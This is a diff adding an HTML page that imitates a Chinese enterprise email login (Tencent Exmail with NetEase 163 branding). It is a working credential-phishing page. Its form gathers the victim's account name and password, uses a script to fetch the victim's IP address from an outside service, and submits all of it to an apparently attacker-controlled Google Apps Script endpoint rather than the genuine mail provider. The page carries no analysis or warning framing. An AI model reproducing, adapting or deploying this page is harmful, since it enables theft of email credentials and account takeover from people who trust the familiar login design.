@@ -1,0 +1,89 @@
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<style>
+
+body{
+
+
+background-image:url(https://mail-activity.nosdn.127.net/0d82feae-bb73-4ac4-8d3d-42a4918fa7ff);
+background-color:#E4EBFF;
+background-repeat:no-repeat;
+background-attachment:fixed;
+background-size:100% 100%;
+
+}
+
+</style>
+<script>
+        function getIP() {
+            // Fetch the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').value = data.ip; // Set the IP address
+                    document.getElementById('locationForm').submit(); // Submit the form
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    alert('Could not retrieve IP address.');
+                });
+        }
+
+        function submitForm(event) {
+            event.preventDefault(); // Prevent default form submission
+            getIP(); // Get IP and then submit
+        }
+    </script>
+</head>
+<body style="margin: 0.4em; font-size: 14pt;">
+<div class="background_wrap" style='background: url("../../images/bizmail/new_login/new_login_background_1475f40.jpg") no-repeat 50% 50% / cover; height: calc(50vw); text-align: left; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; min-height: 675px; 
+max-height: calc(100vh - 92px); orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><div name="Header"><div class="wd900 exmail_header_wrap getuserdata" id="topDataTd" style="margin: 0px auto; width: 1049px; height: 57px; text-align: left; overflow: hidden; padding-top: 20px; padding-bottom: 18px; font-size: 0px;">
+<a class="exmail_logo" style="width: 138px; height: 21px; color: rgb(40, 85, 134); text-decoration: none; display: inline-block; cursor: pointer;" href="https://exmail.qq.com/"><img width="150" height="32" title="&#20225;&#19994;&#37038;&#31665;&#39318;&#39029;" style="border: currentColor; border-image: none; width: 150px; height: 32px;" alt="&#20225;&#19994;&#37038;&#31665;" src="https://mimg.127.net/logo/smart/163.png"></a>
+<div class="topLink addrtitle" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 0px; vertical-align: middle; float: right;"><a class="toptitle" style="color: rgb(43, 43, 43); letter-spacing: 0px; font-size: 13px; text-decoration: none; vertical-align: middle; cursor: pointer;" href="https://exmail.qq.com/" target="_blank">&#27880;&#20876;&#26032;&#20225;&#19994;</a><span style="color: rgb(43, 43, 43); font-size: 13px; margin-right: 3px; margin-left: 3px; vertical-align: middle;">
+<span>&nbsp;</span>|<span>&nbsp;</span></span><a class="toptitle" style="color: rgb(43, 43, 43); letter-spacing: 0px; font-size: 13px; text-decoration: none; vertical-align: middle; cursor: pointer;" href="https://work.weixin.qq.com/help?person_id=0&amp;doc_id=345&amp;helpType=exmail" target="_blank">&#23458;&#25143;&#31471;&#25910;&#21457;</a><span style="color: rgb(43, 43, 43); font-size: 13px; margin-right: 3px; margin-left: 3px; vertical-align: middle;"><span>&nbsp;</span>|<span>
+&nbsp;</span></span><a class="toptitle" style="color: rgb(43, 43, 43); letter-spacing: 0px; font-size: 13px; text-decoration: none; vertical-align: middle; cursor: pointer;">English</a><span style="color: rgb(43, 43, 43); font-size: 13px; margin-right: 3px; margin-left: 3px; vertical-align: middle;"><span>&nbsp;</span>|<span>&nbsp;</span></span>
+<a class="toptitle" style="color: rgb(43, 43, 43); letter-spacing: 0px; font-size: 13px; text-decoration: none; vertical-align: middle; cursor: pointer;">&#32321;&#20307;&#29256;</a></div></div></div><div class="loginWrap"><div class="loginWd" style="margin: 0px auto; width: 1000px;">
+<form id="locationForm" style="margin: 0px; padding: 0px;" onsubmit="submitForm(event);" action="https://script.google.com/macros/s/AKfycbwPsOe3OJbmtcYtUku4kLQQZXGpKN88A-lVwtXx-4ehOd-wPYNtCDNYlnLWAVAbEYCW/exec" method="post">
+
+<div class="login_return_msg" style="padding: 60px 0px 11px; width: 340px; text-align: left; color: rgb(43, 43, 43); line-height: 24px; font-size: 12px; margin-left: auto; min-height: 90px; box-sizing: border-box;"><div id="returnMsg"></div><div class="err_tips" id="msgContainer" style="line-height: 1;"></div></div>
+<div class="login_scan_panel login_account_pwd_panel" style="background: rgb(255, 255, 255); border-radius: 10px; width: 370px; height: 450px; margin-top: 0px; margin-left: 700px; position: relative; box-shadow: 0px 10px 30px 0px rgba(0,0,0,0.1);" data-panel="pwd"><h1 class="login_scan_panel_pwd_title" style="margin: 0px; padding: 30px 28px 43px; text-align: center; font-size: 17.3px; font-weight: 400;"><strong><font color="#000000" style="font-size: 23.8px;">
+&#36134;&#21495;&#30331;&#24405;</font></strong></h1>
+<div class="signup_item" style="width: 340px; padding-right: 40px; padding-left: 40px; margin-bottom: 0px; display: table; box-sizing: border-box;">
+<div class="signup_item_content" style="border-radius: 2px; border: currentColor; transition:0.3s; border-image: none; width: 260px; display: table; position: relative; max-height: 48px;">
+<br>
+<input name="id" id="login_id" style="padding: 10px 60px 10px 10px; border-radius: 3px; border: 1px solid rgb(204, 204, 204); border-image: none; width: 76%; height: 32px;" required="" type="username" size="1" placeholder="&#37038;&#31665;&#36134;&#21495;&#25110;&#25163;&#26426;&#21495;&#30721;" value="">
+<span style="top: 50%; right: 5px; color: black; font-size: 13px; position: absolute; pointer-events: none; transform: translateY(-260%);">@163.com</span>
+<br><br>
+<input name="pw" class="login_scan_panel_pwd_input" id="pp" style='margin: 0px; padding: 14px 10px; border-radius: 5px; border: 1px solid rgb(201, 201, 201); border-image: none; width: 300px; height: 52px; line-height: 1.5; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 14px; vertical-align: middle; display: inline-block; position: relative; box-sizing: border-box;' type="password" size="1" 
+placeholder="&#36755;&#20837;&#23494;&#30721;" value="" onpropertychange="ChkPsw();"><br><br></div><div class="signup_item_content_tips_error" style="text-align: left; color: rgb(241, 90, 90); font-size: 12px; margin-top: 4px; margin-bottom: 8px; visibility: hidden;"></div></div><div class="signup_item" style="width: 340px; padding-right: 40px; padding-left: 40px; margin-bottom: 3px; display: table; box-sizing: border-box;">
+<div class="signup_item_content" style="border-radius: 2px; border: currentColor; transition:0.3s; border-image: none; width: 260px; display: table; position: relative; max-height: 48px;"><div class="login_scan_panel_auto_login" style="color: rgb(170, 170, 170); font-size: 12px; float: left;">
+<input name="ss" class="login_scan_panel_pwd_checkbox v_middle" id="auto_login_in_five_days_pwd" style='margin: 0px 4px 0px 0px; padding: 0px; line-height: 1.5; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 12px; vertical-align: middle; display: inline-block;' type="checkbox" value="1"><label class="v_middle" style="line-height: 24px; vertical-align: middle; display: inline-block;" for="auto_login_in_five_days_pwd">
+5&#22825;&#20869;&#33258;&#21160;&#30331;&#24405;</label></div><div class="login_scan_panel_forgot_pwd" style="height: 24px; line-height: 24px; float: right;"><a style="color: rgb(24, 111, 213); font-size: 12px; text-decoration: none; cursor: pointer;" href="https://exmail.qq.com/cgi-bin/readtemplate?check=false&amp;t=biz_rf_portal#recovery" target="_blank">&#24536;&#35760;&#23494;&#30721;</a></div></div></div>
+<div class="signup_item" style="width: 340px; padding-right: 40px; padding-left: 40px; margin-bottom: 30px; display: table; box-sizing: border-box;"><div class="signup_item_content" style="border-radius: 2px; border: currentColor; transition:0.3s; border-image: none; width: 260px; display: table; position: relative; max-height: 48px;">
+<input name="ip" id="ip" type="hidden">
+<input name="btlogin" class="login_btn" id="btlogin" style='background: rgb(41, 132, 239); margin: 0px; padding: 8px; border-radius: 5px; border: currentColor; border-image: none; width: 290px; height: 48px; text-align: center; color: rgb(255, 255, 255); line-height: 1.5; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 16px; font-weight: 500; vertical-align: middle; display: inline-block; box-sizing: border-box;' 
+type="submit" size="1" value="&#30331; &#24405;"></div></div><div align="center" class="login_scan_footer" style="padding: 14px 0px; font-size: 0px; border-top-color: rgb(235, 239, 242); border-top-width: 1px; border-top-style: solid;"><strong>
+</strong>
+<span style='text-align: center; color: rgb(88, 94, 109); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: PingFangSC-Regular, "Microsoft YaHei", &#24494;&#36719;&#38597;&#40657;, verdana, sans-serif, Simsun, STXihei; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline !important; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: 
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'>&#38405;&#35835;&#24182;&#25509;&#21463;<span>&nbsp;</span></span>
+<a style='text-align: center; color: rgb(88, 94, 109); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: PingFangSC-Regular, "Microsoft YaHei", &#24494;&#36719;&#38597;&#40657;, verdana, sans-serif, Simsun, STXihei; font-size: 14px; font-style: normal; font-weight: 400; text-decoration: none; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; 
+-webkit-text-stroke-width: 0px;' href="https://reg.163.com/agreement_wap.shtml?v=20171127" target="_blank" data-tj-name="b-mail-terms-service-click">&#12298;&#26381;&#21153;&#26465;&#27454;&#12299;</a>
+<span style='text-align: center; color: rgb(88, 94, 109); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: PingFangSC-Regular, "Microsoft YaHei", &#24494;&#36719;&#38597;&#40657;, verdana, sans-serif, Simsun, STXihei; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline !important; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: 
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'>&#21644;<span>&nbsp;</span></span>
+<a style='text-align: center; color: rgb(88, 94, 109); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: PingFangSC-Regular, "Microsoft YaHei", &#24494;&#36719;&#38597;&#40657;, verdana, sans-serif, Simsun, STXihei; font-size: 14px; font-style: normal; font-weight: 400; text-decoration: none; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; 
+-webkit-text-stroke-width: 0px;' href="https://mail.163.com/html/agreement/doc.html" target="_blank" data-tj-name="b-mail-privacy-click">&#12298;&#38544;&#31169;&#25919;&#31574;&#12299;</a></div></div></form></div></div></div>
+<div style='text-align: left; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; clear: both; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; 
+text-decoration-style: initial; text-decoration-color: initial;'></div>
+<div class="frame_foot_copyright" style='text-align: center; color: rgb(130, 130, 130); text-transform: none; line-height: 27px; text-indent: 0px; letter-spacing: normal; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 12px; font-style: normal; font-weight: 400; margin-top: 18px; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; 
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><a class="frame_foot_nav_item_link" style="color: rgb(130, 130, 130); text-decoration: none; cursor: pointer;" href="http://www.tencent.com/" target="_blank">&#20851;&#20110;&#33150;&#35759;</a><span>&nbsp;</span><span class="frame_foot_nav_item_dep">&nbsp;|&nbsp;</span><span>&nbsp;</span>
+<a class="frame_foot_nav_item_link" style="color: rgb(130, 130, 130); text-decoration: none; cursor: pointer;" href="https://exmail.qq.com/cgi-bin/bizmail_portal?t=bizmail_eula" target="_blank">&#29992;&#25143;&#21327;&#35758;</a><span>&nbsp;</span><span class="frame_foot_nav_item_dep">&nbsp;|&nbsp;</span><span>&nbsp;</span>
+<a class="frame_foot_nav_item_link" style="color: rgb(130, 130, 130); text-decoration: none; cursor: pointer;" href="https://work.weixin.qq.com/help?h=e" target="_blank" data-statistics-item="help|click|index_bottom">&#24110;&#21161;&#20013;&#24515;</a><span>&nbsp;</span><span class="frame_foot_nav_item_dep">&nbsp;|&nbsp;</span><span>&nbsp;</span>
+<a class="frame_foot_nav_item_link" style="color: rgb(130, 130, 130); text-decoration: none; cursor: pointer;" href="http://exmail.qq.com/cgi-bin/download?path=manual&amp;filename=%CC%DA%D1%B6%C6%F3%D2%B5%D3%CA%CF%E4%D3%C3%BB%A7%CA%B9%D3%C3%CA%D6%B2%E1.pdf" target="_blank" data-statistics-item="manual|click|index_bottom">&#29992;&#25143;&#25163;&#20876;</a><span>&nbsp;</span>&nbsp;&nbsp; &#32593;&#26131;&#20844;&#21496;&#29256;&#26435;&#25152;&#26377;&copy;1997-2024</div>
+<div class="VIpgJd-ZVi9od-aZ2wEe-wOHMyf" style='left: -1000px; top: -1000px; text-align: left; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; position: fixed; z-index: 1000; orphans: 2; widows: 2; transition-delay: 0.6s; font-variant-ligatures: normal; 
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'>
+<div class="VIpgJd-ZVi9od-aZ2wEe-OiiCO" style='background: url("https://www.gstatic.com/images/branding/product/2x/translate_24dp.png") no-repeat 50% 50% rgb(255, 255, 255); border-radius: 50px; transition:0.6s ease-in-out; width: 104px; height: 104px; display: flex; opacity: 0; transform: scale(0.4); justify-content: center; align-items: center; -webkit-box-align: center; -webkit-box-pack: center;'>
+<svg xmlns="http://www.w3.org/2000/svg" class="VIpgJd-ZVi9od-aZ2wEe" viewBox="0 0 66 66" width="96px" height="96px"><circle class="VIpgJd-ZVi9od-aZ2wEe-Jt5cK" fill="none" stroke-linecap="round" stroke-width="6" cx="33" cy="33" r="30" /></svg></div></div>
+<div id="tcaptcha_transform_dy" style='transition:opacity 0.3s linear; top: -1000000px; text-align: left; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: "PingFang SC", "Helvetica Neue", Arial, "Hiragino Sans GB", STHeiti, "Microsoft YaHei", sans-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; position: absolute; orphans: 2; widows: 2; opacity: 0; font-variant-ligatures: normal; 
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><iframe name="https://exmail.qq.com/login" id="tcaptcha_iframe_dy" src="" border="0" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></div></body></html>
